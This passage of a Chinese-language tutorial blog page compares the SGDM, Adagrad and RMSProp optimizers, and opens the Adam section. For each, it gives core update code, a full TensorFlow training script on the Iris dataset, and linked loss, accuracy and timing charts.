class="built_in">enumerate</span>(train_db):  <span class="comment"># batch级别的循环 ，每个step循环一个batch</span></span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># with结构记录梯度信息</span></span><br><span class="line">            y = tf.matmul(x_train, w1) + b1  <span class="comment"># 神经网络乘加运算</span></span><br><span class="line">            y = tf.nn.softmax(y)  <span class="comment"># 使输出y符合概率分布（此操作后与独热码同量级，可相减求loss）</span></span><br><span class="line">            y_ = tf.one_hot(y_train, depth=<span class="number">3</span>)  <span class="comment"># 将标签值转换为独热码格式，方便计算loss和accuracy</span></span><br><span class="line">            loss = tf.reduce_mean(tf.square(y_ - y))  <span class="comment"># 采用均方误差损失函数mse = mean(sum(y-out)^2)</span></span><br><span class="line">            loss_all += loss.numpy()  <span class="comment"># 将每个step计算出的loss累加，为后续求loss平均值提供数据，这样计算的loss更准确</span></span><br><span class="line">        <span class="comment"># 计算loss对各个参数的梯度</span></span><br><span class="line">        grads = tape.gradient(loss, [w1, b1])</span><br><span class="line"></span><br><span class="line">        <span class="comment">##########################################################################</span></span><br><span class="line">        <span class="comment"># sgd-momentun  </span></span><br><span class="line">        m_w = beta * m_w + (<span class="number">1</span> - beta) * grads[<span class="number">0</span>]</span><br><span class="line">        m_b = beta * m_b + (<span class="number">1</span> - beta) * grads[<span class="number">1</span>]</span><br><span class="line">        w1.assign_sub(lr * m_w)</span><br><span class="line">        b1.assign_sub(lr * m_b)</span><br><span class="line">    <span class="comment">##########################################################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个epoch，打印loss信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Epoch &#123;&#125;, loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch, loss_all / <span class="number">4</span>))</span><br><span class="line">    train_loss_results.append(loss_all / <span class="number">4</span>)  <span class="comment"># 将4个step的loss求平均记录在此变量中</span></span><br><span class="line">    loss_all = <span class="number">0</span>  <span class="comment"># loss_all归零，为记录下一个epoch的loss做准备</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试部分</span></span><br><span class="line">    <span class="comment"># total_correct为预测对的样本个数, total_number为测试的总样本数，将这两个变量都初始化为0</span></span><br><span class="line">    total_correct, total_number = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x_test, y_test <span class="keyword">in</span> test_db:</span><br><span class="line">        <span class="comment"># 使用更新后的参数进行预测</span></span><br><span class="line">        y = tf.matmul(x_test, w1) + b1</span><br><span class="line">        y = tf.nn.softmax(y)</span><br><span class="line">        pred = tf.argmax(y, axis=<span class="number">1</span>)  <span class="comment"># 返回y中最大值的索引，即预测的分类</span></span><br><span class="line">        <span class="comment"># 将pred转换为y_test的数据类型</span></span><br><span class="line">        pred = tf.cast(pred, dtype=y_test.dtype)</span><br><span class="line">        <span class="comment"># 若分类正确，则correct=1，否则为0，将bool型的结果转换为int型</span></span><br><span class="line">        correct = tf.cast(tf.equal(pred, y_test), dtype=tf.int32)</span><br><span class="line">        <span class="comment"># 将每个batch的correct数加起来</span></span><br><span class="line">        correct = tf.reduce_sum(correct)</span><br><span class="line">        <span class="comment"># 将所有batch中的correct数加起来</span></span><br><span class="line">        total_correct += <span class="built_in">int</span>(correct)</span><br><span class="line">        <span class="comment"># total_number为测试的总样本数，也就是x_test的行数，shape[0]返回变量的行数</span></span><br><span class="line">        total_number += x_test.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 总的准确率等于total_correct/total_number</span></span><br><span class="line">    acc = total_correct / total_number</span><br><span class="line">    test_acc.append(acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Test_acc:&quot;</span>, acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------&quot;</span>)</span><br><span class="line">total_time = time.time() - now_time  <span class="comment">##3##</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;total_time&quot;</span>, total_time)  <span class="comment">##4##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 loss 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Loss Function Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Loss&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(train_loss_results, label=<span class="string">&quot;$Loss$&quot;</span>)  <span class="comment"># 逐点画出trian_loss_results值并连线，连线图标是Loss</span></span><br><span class="line">plt.legend()  <span class="comment"># 画出曲线图标</span></span><br><span class="line">plt.show()  <span class="comment"># 画出图像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 Accuracy 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Acc Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Acc&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(test_acc, label=<span class="string">&quot;$Accuracy$&quot;</span>)  <span class="comment"># 逐点画出test_acc值并连线，连线图标是Accuracy</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请将loss曲线、ACC曲线、total_time记录到 class2\优化器对比.docx  对比各优化器收敛情况</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>运行结果</strong>：<br>（包括Loss、Acc图像和训练时间）</p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665150179.png" alt="SGDM-Loss"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665177066.png" alt="SGDM-Acc"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665220628.png" alt="SGDM-Time"></p>
<h2 id="Adagrad优化器"><a href="#Adagrad优化器" class="headerlink" title="Adagrad优化器"></a>Adagrad优化器</h2><blockquote>
<p>在SGD基础上增加二阶动量</p>
</blockquote>
<p><strong>求解过程</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665312569.png" alt="Adagrad"></p>
<p><strong>核心代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v_w, v_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="comment"># adagrad</span></span><br><span class="line">v_w += tf.square(grads[<span class="number">0</span>])</span><br><span class="line">v_b += tf.square(grads[<span class="number">1</span>])</span><br><span class="line">w1.assign_sub(lr * grads[<span class="number">0</span>] / tf.sqrt(v_w))</span><br><span class="line">b1.assign_sub(lr * grads[<span class="number">1</span>] / tf.sqrt(v_b))</span><br></pre></td></tr></table></figure>

<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用鸢尾花数据集，实现前向传播、反向传播，可视化loss曲线</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time  <span class="comment">##1##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入数据，分别为输入特征和标签</span></span><br><span class="line">x_data = datasets.load_iris().data</span><br><span class="line">y_data = datasets.load_iris().target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机打乱数据（因为原始数据是顺序的，顺序不打乱会影响准确率）</span></span><br><span class="line"><span class="comment"># seed: 随机数种子，是一个整数，当设置之后，每次生成的随机数都一样（为方便教学，以保每位同学结果一致）</span></span><br><span class="line">np.random.seed(<span class="number">116</span>)  <span class="comment"># 使用相同的seed，保证输入特征和标签一一对应</span></span><br><span class="line">np.random.shuffle(x_data)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_data)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将打乱后的数据集分割为训练集和测试集，训练集为前120行，测试集为后30行</span></span><br><span class="line">x_train = x_data[:-<span class="number">30</span>]</span><br><span class="line">y_train = y_data[:-<span class="number">30</span>]</span><br><span class="line">x_test = x_data[-<span class="number">30</span>:]</span><br><span class="line">y_test = y_data[-<span class="number">30</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换x的数据类型，否则后面矩阵相乘时会因数据类型不一致报错</span></span><br><span class="line">x_train = tf.cast(x_train, tf.float32)</span><br><span class="line">x_test = tf.cast(x_test, tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from_tensor_slices函数使输入特征和标签值一一对应。（把数据集分批次，每个批次batch组数据）</span></span><br><span class="line">train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(<span class="number">32</span>)</span><br><span class="line">test_db = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成神经网络的参数，4个输入特征故，输入层为4个输入节点；因为3分类，故输出层为3个神经元</span></span><br><span class="line"><span class="comment"># 用tf.Variable()标记参数可训练</span></span><br><span class="line"><span class="comment"># 使用seed使每次生成的随机数相同（方便教学，使大家结果都一致，在现实使用时不写seed）</span></span><br><span class="line">w1 = tf.Variable(tf.random.truncated_normal([<span class="number">4</span>, <span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line">b1 = tf.Variable(tf.random.truncated_normal([<span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">lr = <span class="number">0.1</span>  <span class="comment"># 学习率为0.1</span></span><br><span class="line">train_loss_results = []  <span class="comment"># 将每轮的loss记录在此列表中，为后续画loss曲线提供数据</span></span><br><span class="line">test_acc = []  <span class="comment"># 将每轮的acc记录在此列表中，为后续画acc曲线提供数据</span></span><br><span class="line">epoch = <span class="number">500</span>  <span class="comment"># 循环500轮</span></span><br><span class="line">loss_all = <span class="number">0</span>  <span class="comment"># 每轮分4个step，loss_all记录四个step生成的4个loss的和</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line">v_w, v_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练部分</span></span><br><span class="line">now_time = time.time()  <span class="comment">##2##</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):  <span class="comment"># 数据集级别的循环，每个epoch循环一次数据集</span></span><br><span class="line">    <span class="keyword">for</span> step, (x_train, y_train) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_db):  <span class="comment"># batch级别的循环 ，每个step循环一个batch</span></span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># with结构记录梯度信息</span></span><br><span class="line">            y = tf.matmul(x_train, w1) + b1  <span class="comment"># 神经网络乘加运算</span></span><br><span class="line">            y = tf.nn.softmax(y)  <span class="comment"># 使输出y符合概率分布（此操作后与独热码同量级，可相减求loss）</span></span><br><span class="line">            y_ = tf.one_hot(y_train, depth=<span class="number">3</span>)  <span class="comment"># 将标签值转换为独热码格式，方便计算loss和accuracy</span></span><br><span class="line">            loss = tf.reduce_mean(tf.square(y_ - y))  <span class="comment"># 采用均方误差损失函数mse = mean(sum(y-out)^2)</span></span><br><span class="line">            loss_all += loss.numpy()  <span class="comment"># 将每个step计算出的loss累加，为后续求loss平均值提供数据，这样计算的loss更准确</span></span><br><span class="line">        <span class="comment"># 计算loss对各个参数的梯度</span></span><br><span class="line">        grads = tape.gradient(loss, [w1, b1])</span><br><span class="line"></span><br><span class="line">        <span class="comment">##########################################################################</span></span><br><span class="line">        <span class="comment"># adagrad</span></span><br><span class="line">        v_w += tf.square(grads[<span class="number">0</span>])</span><br><span class="line">        v_b += tf.square(grads[<span class="number">1</span>])</span><br><span class="line">        w1.assign_sub(lr * grads[<span class="number">0</span>] / tf.sqrt(v_w))</span><br><span class="line">        b1.assign_sub(lr * grads[<span class="number">1</span>] / tf.sqrt(v_b))</span><br><span class="line">    <span class="comment">##########################################################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个epoch，打印loss信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Epoch &#123;&#125;, loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch, loss_all / <span class="number">4</span>))</span><br><span class="line">    train_loss_results.append(loss_all / <span class="number">4</span>)  <span class="comment"># 将4个step的loss求平均记录在此变量中</span></span><br><span class="line">    loss_all = <span class="number">0</span>  <span class="comment"># loss_all归零，为记录下一个epoch的loss做准备</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试部分</span></span><br><span class="line">    <span class="comment"># total_correct为预测对的样本个数, total_number为测试的总样本数，将这两个变量都初始化为0</span></span><br><span class="line">    total_correct, total_number = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x_test, y_test <span class="keyword">in</span> test_db:</span><br><span class="line">        <span class="comment"># 使用更新后的参数进行预测</span></span><br><span class="line">        y = tf.matmul(x_test, w1) + b1</span><br><span class="line">        y = tf.nn.softmax(y)</span><br><span class="line">        pred = tf.argmax(y, axis=<span class="number">1</span>)  <span class="comment"># 返回y中最大值的索引，即预测的分类</span></span><br><span class="line">        <span class="comment"># 将pred转换为y_test的数据类型</span></span><br><span class="line">        pred = tf.cast(pred, dtype=y_test.dtype)</span><br><span class="line">        <span class="comment"># 若分类正确，则correct=1，否则为0，将bool型的结果转换为int型</span></span><br><span class="line">        correct = tf.cast(tf.equal(pred, y_test), dtype=tf.int32)</span><br><span class="line">        <span class="comment"># 将每个batch的correct数加起来</span></span><br><span class="line">        correct = tf.reduce_sum(correct)</span><br><span class="line">        <span class="comment"># 将所有batch中的correct数加起来</span></span><br><span class="line">        total_correct += <span class="built_in">int</span>(correct)</span><br><span class="line">        <span class="comment"># total_number为测试的总样本数，也就是x_test的行数，shape[0]返回变量的行数</span></span><br><span class="line">        total_number += x_test.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 总的准确率等于total_correct/total_number</span></span><br><span class="line">    acc = total_correct / total_number</span><br><span class="line">    test_acc.append(acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Test_acc:&quot;</span>, acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------&quot;</span>)</span><br><span class="line">total_time = time.time() - now_time  <span class="comment">##3##</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;total_time&quot;</span>, total_time)  <span class="comment">##4##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 loss 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Loss Function Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Loss&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(train_loss_results, label=<span class="string">&quot;$Loss$&quot;</span>)  <span class="comment"># 逐点画出trian_loss_results值并连线，连线图标是Loss</span></span><br><span class="line">plt.legend()  <span class="comment"># 画出曲线图标</span></span><br><span class="line">plt.show()  <span class="comment"># 画出图像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 Accuracy 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Acc Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Acc&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(test_acc, label=<span class="string">&quot;$Accuracy$&quot;</span>)  <span class="comment"># 逐点画出test_acc值并连线，连线图标是Accuracy</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请将loss曲线、ACC曲线、total_time记录到 class2\优化器对比.docx  对比各优化器收敛情况</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：</p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665461612.png" alt="Adagrad-Loss"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665481996.png" alt="Adagrad-Acc"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665511771.png" alt="Adagrad-Time"></p>
<h2 id="RMSProp优化器"><a href="#RMSProp优化器" class="headerlink" title="RMSProp优化器"></a>RMSProp优化器</h2><blockquote>
<p>SGD基础上增加二阶动量</p>
</blockquote>
<p><strong>求解过程</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665581460.png" alt="RMSProp"></p>
<p><strong>核心代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v_w, v_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">beta = <span class="number">0.9</span></span><br><span class="line"></span><br><span class="line">v_w = beta * v_w + (<span class="number">1</span> - beta) * tf.square(grads[<span class="number">0</span>])</span><br><span class="line">v_b = beta * v_b + (<span class="number">1</span> - beta) * tf.square(grads[<span class="number">1</span>])</span><br><span class="line">w1.assign_sub(lr * grads[<span class="number">0</span>] / tf.sqrt(v_w))</span><br><span class="line">b1.assign_sub(lr * grads[<span class="number">1</span>] / tf.sqrt(v_b))</span><br></pre></td></tr></table></figure>

<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用鸢尾花数据集，实现前向传播、反向传播，可视化loss曲线</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time  <span class="comment">##1##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入数据，分别为输入特征和标签</span></span><br><span class="line">x_data = datasets.load_iris().data</span><br><span class="line">y_data = datasets.load_iris().target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机打乱数据（因为原始数据是顺序的，顺序不打乱会影响准确率）</span></span><br><span class="line"><span class="comment"># seed: 随机数种子，是一个整数，当设置之后，每次生成的随机数都一样（为方便教学，以保每位同学结果一致）</span></span><br><span class="line">np.random.seed(<span class="number">116</span>)  <span class="comment"># 使用相同的seed，保证输入特征和标签一一对应</span></span><br><span class="line">np.random.shuffle(x_data)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_data)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将打乱后的数据集分割为训练集和测试集，训练集为前120行，测试集为后30行</span></span><br><span class="line">x_train = x_data[:-<span class="number">30</span>]</span><br><span class="line">y_train = y_data[:-<span class="number">30</span>]</span><br><span class="line">x_test = x_data[-<span class="number">30</span>:]</span><br><span class="line">y_test = y_data[-<span class="number">30</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换x的数据类型，否则后面矩阵相乘时会因数据类型不一致报错</span></span><br><span class="line">x_train = tf.cast(x_train, tf.float32)</span><br><span class="line">x_test = tf.cast(x_test, tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from_tensor_slices函数使输入特征和标签值一一对应。（把数据集分批次，每个批次batch组数据）</span></span><br><span class="line">train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(<span class="number">32</span>)</span><br><span class="line">test_db = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成神经网络的参数，4个输入特征故，输入层为4个输入节点；因为3分类，故输出层为3个神经元</span></span><br><span class="line"><span class="comment"># 用tf.Variable()标记参数可训练</span></span><br><span class="line"><span class="comment"># 使用seed使每次生成的随机数相同（方便教学，使大家结果都一致，在现实使用时不写seed）</span></span><br><span class="line">w1 = tf.Variable(tf.random.truncated_normal([<span class="number">4</span>, <span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line">b1 = tf.Variable(tf.random.truncated_normal([<span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">lr = <span class="number">0.1</span>  <span class="comment"># 学习率为0.1</span></span><br><span class="line">train_loss_results = []  <span class="comment"># 将每轮的loss记录在此列表中，为后续画loss曲线提供数据</span></span><br><span class="line">test_acc = []  <span class="comment"># 将每轮的acc记录在此列表中，为后续画acc曲线提供数据</span></span><br><span class="line">epoch = <span class="number">500</span>  <span class="comment"># 循环500轮</span></span><br><span class="line">loss_all = <span class="number">0</span>  <span class="comment"># 每轮分4个step，loss_all记录四个step生成的4个loss的和</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line">v_w, v_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">beta = <span class="number">0.9</span></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练部分</span></span><br><span class="line">now_time = time.time()  <span class="comment">##2##</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):  <span class="comment"># 数据集级别的循环，每个epoch循环一次数据集</span></span><br><span class="line">    <span class="keyword">for</span> step, (x_train, y_train) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_db):  <span class="comment"># batch级别的循环 ，每个step循环一个batch</span></span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># with结构记录梯度信息</span></span><br><span class="line">            y = tf.matmul(x_train, w1) + b1  <span class="comment"># 神经网络乘加运算</span></span><br><span class="line">            y = tf.nn.softmax(y)  <span class="comment"># 使输出y符合概率分布（此操作后与独热码同量级，可相减求loss）</span></span><br><span class="line">            y_ = tf.one_hot(y_train, depth=<span class="number">3</span>)  <span class="comment"># 将标签值转换为独热码格式，方便计算loss和accuracy</span></span><br><span class="line">            loss = tf.reduce_mean(tf.square(y_ - y))  <span class="comment"># 采用均方误差损失函数mse = mean(sum(y-out)^2)</span></span><br><span class="line">            loss_all += loss.numpy()  <span class="comment"># 将每个step计算出的loss累加，为后续求loss平均值提供数据，这样计算的loss更准确</span></span><br><span class="line">        <span class="comment"># 计算loss对各个参数的梯度</span></span><br><span class="line">        grads = tape.gradient(loss, [w1, b1])</span><br><span class="line"></span><br><span class="line">        <span class="comment">##########################################################################</span></span><br><span class="line">        <span class="comment"># rmsprop</span></span><br><span class="line">        v_w = beta * v_w + (<span class="number">1</span> - beta) * tf.square(grads[<span class="number">0</span>])</span><br><span class="line">        v_b = beta * v_b + (<span class="number">1</span> - beta) * tf.square(grads[<span class="number">1</span>])</span><br><span class="line">        w1.assign_sub(lr * grads[<span class="number">0</span>] / tf.sqrt(v_w))</span><br><span class="line">        b1.assign_sub(lr * grads[<span class="number">1</span>] / tf.sqrt(v_b))</span><br><span class="line">    <span class="comment">##########################################################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个epoch，打印loss信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Epoch &#123;&#125;, loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch, loss_all / <span class="number">4</span>))</span><br><span class="line">    train_loss_results.append(loss_all / <span class="number">4</span>)  <span class="comment"># 将4个step的loss求平均记录在此变量中</span></span><br><span class="line">    loss_all = <span class="number">0</span>  <span class="comment"># loss_all归零，为记录下一个epoch的loss做准备</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试部分</span></span><br><span class="line">    <span class="comment"># total_correct为预测对的样本个数, total_number为测试的总样本数，将这两个变量都初始化为0</span></span><br><span class="line">    total_correct, total_number = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x_test, y_test <span class="keyword">in</span> test_db:</span><br><span class="line">        <span class="comment"># 使用更新后的参数进行预测</span></span><br><span class="line">        y = tf.matmul(x_test, w1) + b1</span><br><span class="line">        y = tf.nn.softmax(y)</span><br><span class="line">        pred = tf.argmax(y, axis=<span class="number">1</span>)  <span class="comment"># 返回y中最大值的索引，即预测的分类</span></span><br><span class="line">        <span class="comment"># 将pred转换为y_test的数据类型</span></span><br><span class="line">        pred = tf.cast(pred, dtype=y_test.dtype)</span><br><span class="line">        <span class="comment"># 若分类正确，则correct=1，否则为0，将bool型的结果转换为int型</span></span><br><span class="line">        correct = tf.cast(tf.equal(pred, y_test), dtype=tf.int32)</span><br><span class="line">        <span class="comment"># 将每个batch的correct数加起来</span></span><br><span class="line">        correct = tf.reduce_sum(correct)</span><br><span class="line">        <span class="comment"># 将所有batch中的correct数加起来</span></span><br><span class="line">        total_correct += <span class="built_in">int</span>(correct)</span><br><span class="line">        <span class="comment"># total_number为测试的总样本数，也就是x_test的行数，shape[0]返回变量的行数</span></span><br><span class="line">        total_number += x_test.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 总的准确率等于total_correct/total_number</span></span><br><span class="line">    acc = total_correct / total_number</span><br><span class="line">    test_acc.append(acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Test_acc:&quot;</span>, acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------&quot;</span>)</span><br><span class="line">total_time = time.time() - now_time  <span class="comment">##3##</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;total_time&quot;</span>, total_time)  <span class="comment">##4##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 loss 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Loss Function Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Loss&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(train_loss_results, label=<span class="string">&quot;$Loss$&quot;</span>)  <span class="comment"># 逐点画出trian_loss_results值并连线，连线图标是Loss</span></span><br><span class="line">plt.legend()  <span class="comment"># 画出曲线图标</span></span><br><span class="line">plt.show()  <span class="comment"># 画出图像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 Accuracy 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Acc Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Acc&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(test_acc, label=<span class="string">&quot;$Accuracy$&quot;</span>)  <span class="comment"># 逐点画出test_acc值并连线，连线图标是Accuracy</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请将loss曲线、ACC曲线、total_time记录到 class2\优化器对比.docx  对比各优化器收敛情况</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：</p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665746488.png" alt="RMSProp-Loss"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665786654.png" alt="RMSProp-Acc"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665815053.png" alt="RMSProp-Time"></p>
<h2 id="Adam优化器"><a href="#Adam优化器" class="headerlink" title="Adam优化器"></a>Adam优化器</h2><blockquote>
<p>同时结合SGDM一阶动量和RMSProp二阶动量</p>
</blockquote>
<p><strong>求解过程</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642665924305.png" alt="Adam"></p>
<p><strong>核心代码</strong>：</p>
